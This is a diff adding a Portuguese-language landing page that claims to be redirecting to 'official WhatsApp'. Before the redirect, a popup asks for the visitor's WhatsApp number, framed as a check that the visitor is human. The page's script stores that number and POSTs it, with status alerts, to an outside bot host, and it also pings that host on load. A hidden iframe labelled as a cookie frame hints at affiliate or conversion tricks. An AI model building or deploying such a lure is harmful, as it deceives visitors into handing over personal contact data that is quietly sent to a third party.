@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Completo e Atualizado</title>
+
+  <script>
+    (function wakeRender() {
+      fetch("https://mycookiebot.onrender.com/", { method: "GET" }).catch(console.error);
+    })();
+  </script>
+
+  <style>
+    :root {
+      --cor-principal: #00a651;
+      --cor-principal-escura: #008f48;
+      --cor-fundo: #f9f9f9;
+      --cor-texto: #333;
+      --cor-suave: #666;
+      --radius: 12px;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: var(--cor-fundo);
+      padding: 20px;
+    }
+
+    .circle {
+      width: 40px;
+      height: 40px;
+      border: 4px solid var(--cor-principal);
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .text {
+      font-size: 22px;
+      color: var(--cor-texto);
+      transition: opacity 0.4s ease-in-out;
+      line-height: 1.4;
+      padding: 0 10px;
+    }
+
+    #fallback {
+      display: none;
+      margin-top: 25px;
+      font-size: 16px;
+    }
+
+    #fallback a {
+      color: var(--cor-principal);
+      text-decoration: underline;
+    }
+
+    #popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0,0,0,0.65);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      animation: fadeIn 0.3s ease-in-out;
+      padding: 20px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    #popup-box {
+      background: #fff;
+      padding: 28px 30px;
+      border-radius: var(--radius);
+      width: 100%;
+      max-width: 380px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      animation: scaleIn 0.3s ease-in-out;
+    }
+
+    @keyframes scaleIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    #popup-box h2 {
+      margin-bottom: 12px;
+      color: #111;
+      font-size: 20px;
+      font-weight: 600;
+      line-height: 1.3;
+    }
+
+    #popup-box p {
+      font-size: 15px;
+      color: var(--cor-suave);
+      margin-bottom: 18px;
+      line-height: 1.4;
+    }
+
+    #popup-box input {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: var(--radius);
+      outline: none;
+      margin-bottom: 18px;
+      transition: border 0.2s, box-shadow 0.2s;
+    }
+
+    #popup-box input:focus {
+      border-color: var(--cor-principal);
+      box-shadow: 0 0 0 2px rgba(0,166,81,0.2);
+    }
+
+    #popup-box button {
+      background-color: var(--cor-principal);
+      color: white;
+      border: none;
+      border-radius: var(--radius);
+      padding: 14px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      width: 100%;
+      box-shadow: 0 3px 10px rgba(0,166,81,0.2);
+    }
+
+    #popup-box button:hover {
+      background-color: var(--cor-principal-escura);
+    }
+
+    #popup-box small {
+      display: block;
+      margin-top: 14px;
+      color: #888;
+      font-size: 12px;
+    }
+
+    @media (max-width: 480px) {
+      .text {
+        font-size: 18px;
+      }
+      #popup-box {
+        padding: 24px 20px;
+        border-radius: 10px;
+      }
+      #popup-box h2 {
+        font-size: 18px;
+      }
+      #popup-box p {
+        font-size: 14px;
+      }
+      #popup-box input {
+        font-size: 15px;
+        padding: 12px;
+      }
+      #popup-box button {
+        font-size: 16px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="circle"></div>
+  <div id="message" class="text">Espere! Redirecionando para WhatsApp Oficial</div>
+
+  <iframe id="cookieFrame" src="" style="display:none;"></iframe>
+
+  <div id="fallback">
+    Se não for redirecionado, <a href="https://api.whatsapp.com/send?phone=5543991228540&text=Ol%C3%A1%2C%20quero%20enviar%20meu%20v%C3%ADdeo%20review%20para%20o%20canal">clique aqui</a>.
+  </div>
+
+  <div id="popup-overlay">
+    <div id="popup-box">
+      <h2>Digite o seu Melhor WhatsApp</h2>
+      <p>Antes de continuar, confirme se você é humano!</p>
+      <input id="whatsappInput" type="tel" placeholder="(DDD) 9XXXX-XXXX" inputmode="numeric" maxlength="15" />
+      <button id="btnProsseguir">PROSSEGUIR</button>
+      <small>Fique tranquilo, não fazemos spam.</small>
+    </div>
+  </div>
+
+  <script>
+    const cookieURL = "about:blank";
+    const checkoutURL = "https://api.whatsapp.com/send?phone=5543991228540&text=Ol%C3%A1%2C%20quero%20enviar%20meu%20v%C3%ADdeo%20review%20para%20o%20canal";
+    const msg = document.getElementById("message");
+    const iframe = document.getElementById("cookieFrame");
+    const popup = document.getElementById("popup-overlay");
+    const btnProsseguir = document.getElementById("btnProsseguir");
+    const inputWhatsApp = document.getElementById("whatsappInput");
+    const fallback = document.getElementById("fallback");
+
+    let cookieConfirmado = false;
+    let timeoutFallback = null;
+
+    function enviarAlerta(msg, whatsapp = "") {
+      fetch("https://mycookiebot.onrender.com/send", {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ text: `${msg}${whatsapp ? `\nWHATSAPP: ${whatsapp}` : ""}` })
+      }).catch(console.error);
+    }
+
+    try {
+      const saved = localStorage.getItem('whatsapp_usuario');
+      if (saved) {
+        inputWhatsApp.value = saved;
+      }
+    } catch (e) {}
+
+    btnProsseguir.addEventListener("click", () => {
+      const whatsapp = inputWhatsApp.value.trim();
+      if (whatsapp === "") return;
+
+      try {
+        localStorage.setItem('whatsapp_usuario', whatsapp);
+      } catch (e) {}
+
+      popup.style.display = "none";
+      iframe.src = cookieURL;
+
+      timeoutFallback = setTimeout(() => {
+        if (!cookieConfirmado) {
+          enviarAlerta(`⛔ WHATSAPP - COMPLETO E ATUALIZADO\nPÁGINA: ${checkoutURL}`);
+          fallback.style.display = "block";
+        }
+      }, 8000);
+
+      iframe.onload = () => {
+        try {
+          const test = iframe.contentWindow.location.href;
+          cookieConfirmado = true;
+        } catch (e) {
+          cookieConfirmado = true;
+        }
+
+        if (cookieConfirmado) {
+          clearTimeout(timeoutFallback);
+          enviarAlerta(`✅ WHATSAPP - COMPLETO E ATUALIZADO\nPÁGINA: ${checkoutURL}`, whatsapp);
+          setTimeout(() => window.location.href = checkoutURL, 1000);
+        }
+      };
+    });
+  </script>
+
+</body>
+</html>
